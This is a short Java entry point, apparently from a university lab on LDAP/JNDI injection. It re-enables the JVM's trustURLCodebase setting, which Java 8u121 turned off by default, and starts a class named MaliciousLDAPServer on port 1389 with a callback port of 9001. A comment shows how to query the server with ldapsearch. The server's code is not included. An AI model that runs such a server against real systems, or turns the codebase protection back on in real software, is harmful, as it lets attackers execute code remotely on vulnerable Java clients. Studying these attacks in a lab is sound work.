package ch.unige.ldap;

/**
 * Hello world !
 * mvn package + java -cp target/my-app-1.0-SNAPSHOT.jar ch.unige.ldap.App
 */
public class App {
    public static void main( String[] args ) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        // see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html
        // query this server with ldapsearch -H ldap://0.0.0.0:1389 -b "dc=unige,dc=ch" -s sub -x "(objectclass=*)"
        MaliciousLDAPServer ldapServer = new MaliciousLDAPServer(
            "dc=unige,dc=ch", 
            1389, 
            "0.0.0.0",
            9001
        );
        ldapServer.listen();

    }
}
